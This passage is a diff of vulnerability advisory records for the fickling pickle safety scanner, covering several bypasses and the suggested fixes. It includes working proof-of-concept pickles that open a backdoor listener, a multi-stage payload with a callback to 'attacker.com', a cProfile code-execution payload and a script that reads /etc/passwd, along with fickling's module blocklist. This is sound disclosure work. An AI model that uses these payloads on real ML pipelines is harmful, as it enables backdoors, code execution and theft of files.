return buf.getvalue()\n\nimport fickling, tempfile, os\ndata = make_obj_pop_bypass()\npath = os.path.join(tempfile.mkdtemp(), \"bypass.pkl\")\nwith open(path, \"wb\") as f:\n    f.write(data)\n\nprint(fickling.is_likely_safe(path))\n# Output: True  <-- BYPASSED (network connection invisible to fickling)\n```\n\nfickling decompiles this to:\n```python\nfrom smtplib import SMTP\nresult = None\n```\n\nYet at runtime, `SMTP('127.0.0.1')` executes and opens a TCP connection.\n\n**CLI verification:**\n```bash\n$ fickling --check-safety bypass.pkl; echo \"EXIT: $?\"\nEXIT: 0    # BYPASSED\n```\n\n**Comparison with REDUCE (same function, detected):**\n```bash\n$ fickling --check-safety reduce_smtp.pkl; echo \"EXIT: $?\"\nWarning: Fickling detected that the pickle file may be unsafe.\nEXIT: 1    # DETECTED\n```\n\n### Backdoor listener PoC (most impactful)\n\nA pickle that opens a TCP listener on port 9999, binding to all interfaces:\n\n```python\nimport io, struct\n\ndef sbu(s):\n    b = s.encode()\n    return b\"\\x8c\" + struct.pack(\"<B\", len(b)) + b\n\ndef binint(n):\n    return b\"J\" + struct.pack(\"<i\", n)\n\ndef make_backdoor():\n    buf = io.BytesIO()\n    buf.write(b\"\\x80\\x04\\x95\")  # PROTO 4 + FRAME\n\n    payload = io.BytesIO()\n    # OBJ+POP: TCPServer(('0.0.0.0', 9999), BaseRequestHandler)\n    payload.write(b\"(\")                                          # MARK\n    payload.write(sbu(\"socketserver\") + sbu(\"TCPServer\") + b\"\\x93\")  # STACK_GLOBAL\n    payload.write(b\"(\")                                          # MARK (inner tuple)\n    payload.write(sbu(\"0.0.0.0\"))                                # host\n    payload.write(binint(9999))                                  # port\n    payload.write(b\"t\")                                          # TUPLE\n    payload.write(sbu(\"socketserver\") + sbu(\"BaseRequestHandler\") + b\"\\x93\")  # handler\n    payload.write(b\"o\")                                          # OBJ\n    payload.write(b\"0\")                                          # POP\n    payload.write(b\"N.\")                                         # NONE + STOP\n\n    frame_data = payload.getvalue()\n    buf.write(struct.pack(\"<Q\", len(frame_data)))\n    buf.write(frame_data)\n    return buf.getvalue()\n\nimport fickling\ndata = make_backdoor()\nwith open(\"/tmp/backdoor.pkl\", \"wb\") as f:\n    f.write(data)\n\nprint(fickling.is_likely_safe(\"/tmp/backdoor.pkl\"))\n# Output: True  <-- BYPASSED\n\nimport pickle, socket\nserver = pickle.loads(data)\n# Port 9999 is now LISTENING on all interfaces\n\ns = socket.socket()\ns.connect((\"127.0.0.1\", 9999))\nprint(\"Connected to backdoor port!\")  # succeeds\ns.close()\nserver.server_close()\n```\n\n### Multi-stage combined PoC\n\nA single pickle combining signal suppression + backdoor listener + outbound callback + file persistence:\n\n```python\n# All four operations in one pickle, all invisible to fickling:\n# 1. signal.signal(SIGTERM, SIG_IGN) - suppress graceful shutdown\n# 2. socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler) - backdoor\n# 3. smtplib.SMTP('attacker.com') - C2 callback\n# 4. sqlite3.connect('/tmp/.marker') - persistence marker\n\n# fickling reports: LIKELY_SAFE\n# All 4 operations execute at runtime\n```\n\n\n**`always_check_safety()` verification:**\n```python\nimport fickling, pickle\n\nfickling.always_check_safety()\nwith open(\"poc_obj_multi.pkl\", \"rb\") as f:\n    result = pickle.load(f)\n# No UnsafeFileError raised -- all 4 malicious operations executed\n```\n\n## Impact\n\nAn attacker can distribute a malicious pickle file (e.g., a backdoored ML model) that passes all fickling safety checks. Demonstrated impacts:\n\n- **Backdoor network listener**: `socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler)` opens a port on all interfaces. The TCPServer constructor calls `server_bind()` and `server_activate()`, so the port is open immediately after `pickle.loads()` returns.\n- **Process persistence**: `signal.signal(SIGTERM, SIG_IGN)` makes the process ignore SIGTERM. In Kubernetes/Docker/ECS, the backdoor stays alive for 30+ seconds per restart attempt.\n- **Outbound exfiltration**: `smtplib.SMTP('attacker.com')` opens an outbound TCP connection. The attacker's server learns the victim's IP and hostname.\n- **File creation on disk**: `sqlite3.connect(path)` creates a file at an attacker-chosen path.\n\nA single pickle combines all operations. In cloud ML environments, this enables persistent backdoor access while resisting graceful shutdown. This affects any application using fickling as a safety gate for ML model files.\n\nThe bypass works for any stdlib module NOT in fickling's `UNSAFE_IMPORTS` blocklist. Blocked modules (os, subprocess, socket, builtins, etc.) are still detected at the import level.\n\n## Suggested Fix\n\nAdd `new_variable()` to `Obj.run()` (lines 1348 and 1350), applying the same pattern used by `Reduce.run()` (line 1300):\n\n```python\n# fickle.py, Obj.run():\n-       if args or hasattr(kls, \"__getinitargs__\") or not isinstance(kls, type):\n-           interpreter.stack.append(ast.Call(kls, args, []))\n-       else:\n-           interpreter.stack.append(ast.Call(kls, kls, []))\n+       if args or hasattr(kls, \"__getinitargs__\") or not isinstance(kls, type):\n+           call = ast.Call(kls, args, [])\n+       else:\n+           call = ast.Call(kls, kls, [])\n+       var_name = interpreter.new_variable(call)\n+       interpreter.stack.append(ast.Name(var_name, ast.Load()))\n```\n\nAlso apply to `NewObj.run()` (line 1414) and `NewObjEx.run()` (line 1426) for defense in depth.",
+      "published": "2026-02-24T21:41:31Z",
+      "modified": "2026-02-24T21:47:56.673405Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-mxhj-88fx-4pcv"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/ff423dade2bb1f72b2b48586c022fac40cbd9a4a"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-mxhj-88fx-4pcv",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.8"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7"
+      ]
+    },
+    {
+      "id": "GHSA-p523-jq9w-64x9",
+      "primary_id": "CVE-2026-22607",
+      "aliases": [
+        "CVE-2026-22607"
+      ],
+      "cve_ids": [
+        "CVE-2026-22607"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling Blocklist Bypass: cProfile.run()",
+      "details": "# Fickling's assessment\n\n`cProfile` was added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/dc8ae12966edee27a78fe05c5745171a2b138d43).\n\n# Original report\n\n## Description\n\n### Summary\n\nFickling versions up to and including 0.1.6 do not treat Python's `cProfile` module as unsafe. Because of this, a malicious pickle that uses `cProfile.run()` is classified as SUSPICIOUS instead of OVERTLY_MALICIOUS.\n\nIf a user relies on Fickling's output to decide whether a pickle is safe to deserialize, this misclassification can lead them to execute attacker-controlled code on their system.\n\nThis affects any workflow or product that uses Fickling as a security gate for pickle deserialization.\n\n### Details\n\nThe `cProfile` module is missing from fickling's block list of unsafe module imports in `fickling/analysis.py`. This is the same root cause as CVE-2025-67748 (pty) and CVE-2025-67747 (marshal/types).\n\nIncriminated source code:\n\n- File: `fickling/analysis.py`\n- Class: `UnsafeImports`\n- Issue: The blocklist does not include `cProfile`, `cProfile.run`, or `cProfile.runctx`\n\nReference to similar fix:\n\n- PR #187 added `pty` to the blocklist to fix CVE-2025-67748\n- PR #108 documented the blocklist approach\n- The same fix pattern should be applied for `cProfile`\n\nHow the bypass works:\n\n1. Attacker creates a pickle using `cProfile.run()` in `__reduce__`\n2. `cProfile.run()` accepts a Python code string and executes it directly (C-accelerated version of profile.run)\n3. Fickling's `UnsafeImports` analysis does not flag `cProfile` as dangerous\n4. Only the `UnusedVariables` heuristic triggers, resulting in SUSPICIOUS severity\n5. The pickle should be rated OVERTLY_MALICIOUS like `os.system`, `eval`, and `exec`\n\nTested behavior (fickling 0.1.6):\n\n| Function | Fickling Severity | RCE Capable |\n|----------|-------------------|-------------|\n| os.system | LIKELY_OVERTLY_MALICIOUS | Yes |\n| eval | OVERTLY_MALICIOUS | Yes |\n| exec | OVERTLY_MALICIOUS | Yes |\n| cProfile.run | SUSPICIOUS | Yes \u2190 BYPASS |\n| cProfile.runctx | SUSPICIOUS | Yes \u2190 BYPASS |\n\nSuggested fix:\n\nAdd to the unsafe imports blocklist in `fickling/analysis.py`:\n- `cProfile`\n- `cProfile.run`\n- `cProfile.runctx`\n- `_lsprof` (underlying C module)\n\n## PoC\n\nComplete instructions, including specific configuration details, to reproduce the vulnerability.\n\nEnvironment:\n- Python 3.13.2\n- fickling 0.1.6 (latest version, installed via pip)\n\n### Step 1: Create malicious pickle\n\n```python\nimport pickle\nimport cProfile\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        return (cProfile.run, (\"print('CPROFILE_RCE_CONFIRMED')\",))\n\nwith open(\"malicious.pkl\", \"wb\") as f:\n    pickle.dump(MaliciousPayload(), f)\n```\n\n### Step 2: Analyze with fickling\n\n```python\nfrom fickling.fickle import Pickled\nfrom fickling.analysis import check_safety\n\nwith open('malicious.pkl', 'rb') as f:\n    data = f.read()\n\npickled = Pickled.load(data)\nresult = check_safety(pickled)\nprint(f\"Severity: {result.severity}\")\nprint(f\"Analysis: {result}\")\n```\n\nExpected output (if properly detected):\n```\nSeverity: Severity.OVERTLY_MALICIOUS\n```\n\nActual output (bypass confirmed):\n```\nSeverity: Severity.SUSPICIOUS\nAnalysis: Variable `_var0` is assigned value `run(...)` but unused afterward; this is suspicious and indicative of a malicious pickle file\n```\n\n### Step 3: Prove RCE by loading the pickle\n\n```bash\npython -c \"import pickle; pickle.load(open('malicious.pkl', 'rb'))\"\n```\n\nOutput\n```\nCPROFILE_RCE_CONFIRMED\n         4 function calls in 0.000 seconds\n\n   Ordered by: standard name\n\n   ncalls  tottime  percall  cumtime  percall filename:lineno(function)\n        1    0.000    0.000    0.000    0.000 <string>:1(<module>)\n        1    0.000    0.000    0.000    0.000 {built-in method builtins.exec}\n        1    0.000    0.000    0.000    0.000 {built-in method builtins.print}\n        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}\n```\n\nCheck: The code executes, proving RCE.\n\n### Pickle disassembly (evidence):\n\n```\n    0: \\x80 PROTO      5\n    2: \\x95 FRAME      58\n   11: \\x8c SHORT_BINUNICODE 'cProfile'\n   21: \\x94 MEMOIZE    (as 0)\n   22: \\x8c SHORT_BINUNICODE 'run'\n   27: \\x94 MEMOIZE    (as 1)\n   28: \\x93 STACK_GLOBAL\n   29: \\x94 MEMOIZE    (as 2)\n   30: \\x8c SHORT_BINUNICODE \"print('CPROFILE_RCE_CONFIRMED')\"\n   63: \\x94 MEMOIZE    (as 3)\n   64: \\x85 TUPLE1\n   65: \\x94 MEMOIZE    (as 4)\n   66: R    REDUCE\n   67: \\x94 MEMOIZE    (as 5)\n   68: .    STOP\nhighest protocol among opcodes = 4\n```\n\n## Impact\n\nVulnerability Type:\n\nIncomplete blocklist leading to safety check bypass (CWE-184) and arbitrary code execution via insecure deserialization (CWE-502).\n\nWho is impacted:\n\nAny user or system that relies on fickling to vet pickle files for security issues before loading them. This includes:\n- ML model validation pipelines\n- Model hosting platforms (Hugging Face, MLflow, etc.)\n- Security scanning tools that use fickling\n- CI/CD pipelines that validate pickle artifacts\n\nAttack scenario:\n\nAn attacker uploads a malicious ML model or pickle file to a model repository. The victim's pipeline uses fickling to scan uploads. Fickling rates the file as \"SUSPICIOUS\" (not \"OVERTLY_MALICIOUS\"), so the file is not rejected. When the victim loads the model, arbitrary code executes on their system.\n\nWhy cProfile.run() is dangerous:\n\nUnlike `runpy.run_path()` which requires a file on disk, `cProfile.run()` takes a code string directly. This means the entire attack is self-contained in the pickle - no external files needed. Python docs explicitly state that `cProfile.run()` takes \"a single argument that can be passed to the exec() function\".\n\n`cProfile` is the C-accelerated version and is more commonly available than `profile`. It's also the recommended profiler per Python docs (\"cProfile is recommended for most users\"), so it's present in virtually all Python installations.\n\nSeverity: HIGH\n\n- The attacker achieves arbitrary code execution\n- The security control (fickling) is specifically designed to prevent this\n- The bypass requires no special conditions beyond crafting the pickle with cProfile\n- Attack is fully self-contained (no external files needed)\n- cProfile is more commonly used than profile, increasing attack surface",
+      "published": "2026-01-09T21:04:22Z",
+      "modified": "2026-02-03T03:15:38.786739Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-565g-hwwr-4pp3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-p523-jq9w-64x9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-r7v6-mfhq-g3m2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22607"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/108"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/187"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/195"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/dc8ae12966edee27a78fe05c5745171a2b138d43"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L116"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.7"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-p523-jq9w-64x9",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ]
+    },
+    {
+      "id": "GHSA-q5qq-mvfm-j35x",
+      "primary_id": "CVE-2026-22609",
+      "aliases": [
+        "CVE-2026-22609"
+      ],
+      "cve_ids": [
+        "CVE-2026-22609"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling has Static Analysis Bypass via Incomplete Dangerous Module Blocklist",
+      "details": "#Fickling's assessment\n\n`ctypes`, `importlib`, `runpy`, `code` and `multiprocessing` were added the list of unsafe imports (https://github.com/trailofbits/fickling/commit/9a2b3f89bd0598b528d62c10a64c1986fcb09f66, https://github.com/trailofbits/fickling/commit/eb299b453342f1931c787bcb3bc33f3a03a173f9, https://github.com/trailofbits/fickling/commit/29d5545e74b07766892c1f0461b801afccee4f91, https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1, https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1). \n\n# Original report\n\n## Summary\n\nThe `unsafe_imports()` method in Fickling's static analyzer fails to flag several high-risk Python modules that can be used for arbitrary code execution. Malicious pickles importing these modules will not be detected as unsafe, allowing attackers to bypass Fickling's primary static safety checks.\n\n## Details\n\nIn `fickling/fickle.py` lines 866-884, the `unsafe_imports()` method checks imported modules against a hardcoded tuple:\n\n```python\ndef unsafe_imports(self) -> Iterator[ast.Import | ast.ImportFrom]:\n    for node in self.properties.imports:\n        if node.module in (\n            \"__builtin__\", \"__builtins__\", \"builtins\", \"os\", \"posix\", \"nt\",\n            \"subprocess\", \"sys\", \"builtins\", \"socket\", \"pty\", \"marshal\", \"types\",\n        ):\n            yield node\n```\n\nThis list is incomplete. The following dangerous modules are NOT detected:\n\n- **ctypes**: Allows arbitrary memory access, calling C functions, and bypassing Python restrictions entirely\n- **importlib**: Can dynamically import any module at runtime\n- **runpy**: Can execute Python modules as scripts\n- **code**: Can compile and execute arbitrary Python code\n- **multiprocessing**: Can spawn processes with arbitrary code\n\nSince `ctypes` is part of the Python standard library, it also bypasses the `NonStandardImports` analysis.\n\n## PoC\n\n```python\nfrom fickling.fickle import Pickled\nfrom fickling.analysis import check_safety, Severity\n\n# Pickle that imports ctypes.pythonapi (allows arbitrary code execution)\n# PROTO 4, GLOBAL 'ctypes pythonapi', STOP\npayload = b'\\x80\\x04cctypes\\npythonapi\\n.'\n\npickled = Pickled.load(payload)\nresults = check_safety(pickled)\n\nprint(f\"Severity: {results.severity.name}\")\nprint(f\"Is safe: {results.severity == Severity.LIKELY_SAFE}\")\n\n# Output: Severity is LIKELY_SAFE or low - the ctypes import is not flagged\n# A truly malicious pickle using ctypes could execute arbitrary code\n```\n\n## Impact\n\n**Security Bypass (Confidentiality, Integrity, Availability)**\n\nAn attacker can craft a malicious pickle that:\n1. Imports `ctypes` to gain arbitrary memory access\n2. Uses `ctypes.pythonapi` or `ctypes.CDLL` to execute arbitrary code\n3. Passes Fickling's safety analysis as \"likely safe\"\n4. Executes malicious code when the victim loads the pickle after trusting Fickling's verdict\n\nThis undermines the core purpose of Fickling as a pickle safety scanner.",
+      "published": "2026-01-09T21:12:00Z",
+      "modified": "2026-02-03T03:15:58.315728Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-q5qq-mvfm-j35x"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22609"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/195"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/29d5545e74b07766892c1f0461b801afccee4f91"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/6b400e1a2525e6a4a076c97ccc0d4d9581317101"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/9a2b3f89bd0598b528d62c10a64c1986fcb09f66"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/eb299b453342f1931c787bcb3bc33f3a03a173f9"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L88"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.7"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-q5qq-mvfm-j35x",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ]
+    },
+    {
+      "id": "GHSA-r48f-3986-4f9c",
+      "primary_id": "GHSA-r48f-3986-4f9c",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "fickling modules linecache, difflib and gc are missing from the unsafe modules blocklist",
+      "details": "# Our analysis\n\nAs stated in the [project's security policy](https://github.com/trailofbits/fickling/security/policy), we also don't consider `UnusedVariables` bypasses to be security issues. We added several unsafe modules mentioned by the reporter in advisory comments to the blocklist (https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d). \n\n# Original report\n\nTitle: UnusedVariables analysis bypass via BUILD opcode Arbitrary File Read through fickling.load()\n\n### Summary\nTwo independent bugs in fickling's AST-based static analysis combine to allow a malicious pickle file to execute arbitrary stdlib function calls - including reading sensitive files - while check_safety() returns Severity.LIKELY_SAFE and fickling.load() completes without raising UnsafeFileError.\n\nA server using fickling.load() as a security gate before deserializing untrusted pickle data (its documented use case) is fully bypassed. The attacker receives the contents of any file readable by the server process as the return value of fickling.load().\n\n### Details\nInterpreter.unused_assignments() does not scan the result assignment's RHS\n\nFile: fickling/fickle.py, Interpreter.unused_assignments(), ~line 1242\n\n```python\nfor statement in self.module_body:\n    if isinstance(statement, ast.Assign):\n        if (\n            len(statement.targets) == 1\n            and isinstance(statement.targets[0], ast.Name)\n            and statement.targets[0].id == \"result\"\n        ):\n            break\n        ...\n        statement = statement.value\n    if statement is not None:\n        for node in ast.walk(statement):\n            if isinstance(node, ast.Name):\n                used.add(node.id)\n```\n\nWhen the loop reaches result = _varN, it breaks immediately. The right-hand side of the result assignment is never walked for variable references. Any variable whose only reference is inside the result expression is therefore never added to the used set and is incorrectly flagged as unused - unless it also appears in an earlier non-assignment statement.\n\nThe BUILD opcode generates exactly such a non-assignment statement:\n\n```python\n# Build.run() generates:\n_var4 = _var3                     # Assign  - _var3 added to used\n_var4.__setstate__(_var2)         # Expr    - _var2 and _var4 added to used\n```\n\nThis makes _var2 (the result of the dangerous call) appear in the used set via the __setstate__ expression, so UnusedVariables never flags it.\n\nFile: fickling/fickle.py, TupleThree.run(), and siblings\n\n```python\ndef run(self, interpreter: Interpreter):\n    top = interpreter.stack.pop()\n    mid = interpreter.stack.pop()\n    bot = interpreter.stack.pop()\n    interpreter.stack.append(ast.Tuple((bot, mid, top), ast.Load()))\n    #                                   ^^^^^^^^^^^^^^^^\n    #                                   Python tuple, not list\n```\n\nPython's ast module requires repeated fields (such as Tuple.elts) to be lists. When elts is a Python tuple, ast.iter_child_nodes() does not yield its elements, so ast.walk() never descends into them. Any variable reference stored inside such a tuple node is invisible to every analysis that uses ast.walk() - including UnusedVariables.\n\nDemo:\n\n```python\nimport ast\nname = ast.Name(id='_var1', ctx=ast.Load())\n\n# Correct (list elts) - ast.walk finds it\nt = ast.Tuple(elts=[name], ctx=ast.Load())\nprint([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # ['_var1']\n\n# Buggy (tuple elts) - ast.walk finds nothing\nt = ast.Tuple(elts=(name,), ctx=ast.Load())\nprint([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # []\n```\n\n#### Combined attack - arbitrary file read\n\nThe two bugs combine with the absence of `linecache` and `difflib` from `UNSAFE_IMPORTS`:\n```\nfrom linecache import getlines      # not in UNSAFE_IMPORTS\n_var0 = getlines('/etc/passwd')     # reads the file\nfrom builtins import enumerate\n_var1 = enumerate(_var0)            # _var0 in RHS - added to used\nfrom builtins import dict\n_var2 = dict(_var1)                 # _var1 in RHS - added to used; produces {0:'line1',...}\nfrom difflib import Differ\n_var3 = Differ()                    # stdlib, not in UNSAFE_IMPORTS\n_var4 = _var3\n_var4.__setstate__(_var2)           # BUILD Expr - _var2 and _var4 added to used\nresult = _var3                      # loop breaks here; nothing in defined\u2212used\n```\n\ncheck_safety() returns Severity.LIKELY_SAFE. fickling.load() calls pickle.loads(). At runtime, Differ().__dict__.update({0: 'root:x:0:0\\n', ...}) succeeds and the file contents are returned to the caller.\n\n### PoC\n`pip install fickling`\n\n```python\n#!/usr/bin/env python3\nimport io\nimport sys\n\nimport fickling.fickle as op\nfrom fickling.fickle import Pickled\nfrom fickling.analysis import check_safety, Severity\nfrom fickling.loader import load\nfrom fickling.exception import UnsafeFileError\n\nTARGET = \"/etc/passwd\"\n\npickled = Pickled([\n    op.Proto.create(4),\n\n    op.ShortBinUnicode(\"linecache\"),\n    op.ShortBinUnicode(\"getlines\"),\n    op.StackGlobal(),\n    op.ShortBinUnicode(TARGET),\n    op.TupleOne(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[0] = _var0 = getlines(TARGET)\n\n    op.Global(\"builtins enumerate\"),\n    op.BinGet(0),\n    op.TupleOne(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[1] = _var1 = enumerate(_var0)\n\n    op.Global(\"builtins dict\"),\n    op.BinGet(1),\n    op.TupleOne(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[2] = _var2 = dict(_var1)\n\n    op.ShortBinUnicode(\"difflib\"),\n    op.ShortBinUnicode(\"Differ\"),\n    op.StackGlobal(),\n    op.EmptyTuple(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[3] = _var3 = Differ()\n\n    op.BinGet(2),                   # push _var2 as BUILD state\n    op.Build(),                     # _var4=_var3; _var4.__setstate__(_var2)\n\n    op.BinGet(3),\n    op.Stop(),\n])\n\nresult = check_safety(pickled)\nassert result.severity == Severity.LIKELY_SAFE, f\"Expected LIKELY_SAFE, got {result.severity}\"\nprint(f\"[+] check_safety verdict : {result.severity.name}  (bypass confirmed)\")\n\nbuf = io.BytesIO()\npickled.dump(buf)\n\nobj = load(io.BytesIO(buf.getvalue()))\nlines = {k: v for k, v in obj.__dict__.items() if isinstance(k, int)}\n\nprint(f\"[+] fickling.load() returned : {type(obj).__name__}\")\nprint(f\"[+] {TARGET} - {len(lines)} lines exfiltrated:\\n\")\nfor i in sorted(lines):\n    print(f\"{lines[i]}\", end=\"\")\n```\n\n### Result\n\n```\n[+] check_safety verdict : LIKELY_SAFE  (bypass confirmed)\n[+] fickling.load() returned : Differ\n[+] /etc/passwd - 58 lines exfiltrated:\n\n    root:x:0:0:root:/root:/usr/bin/zsh\n    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n    bin:x:2:2:bin:/bin:/usr/sbin/nologin\n    sys:x:3:3:sys:/dev:/usr/sbin/nologin\n    sync:x:4:65534:sync:/bin:/bin/sync\n    games:x:5:60:games:/usr/games:/usr/sbin/nologin\n    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n    dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n    systemd-timesync:x:992:992:systemd Time Synchronization:/:/usr/sbin/nologin\n\n```\n\n### Impact\nVulnerability type: Static analysis bypass leading to arbitrary file read (and arbitrary stdlib code execution) through a security-gated deserialization API.\n\nWho is impacted: Any application or service that calls fickling.load() or fickling.loads() to validate untrusted pickle data before deserializing it. This is the primary documented use case of the fickling.loader module. The attacker supplies a pickle file; the server processes it through fickling.load(), receives LIKELY_SAFE, and unpickles the payload. File contents are returned directly in the deserialized object's attributes.\n\nBeyond file read, the same BUILD-opcode technique can be applied to any stdlib module absent from UNSAFE_IMPORTS (e.g., gc.get_objects() for full in-process memory inspection, inspect.stack() for call-frame local variable exfiltration, netrc.netrc() for credential theft).",
+      "published": "2026-03-13T20:57:40Z",
+      "modified": "2026-03-13T21:09:40.043972Z",
+      "severity": {
+        "type": "CVSS_V4",
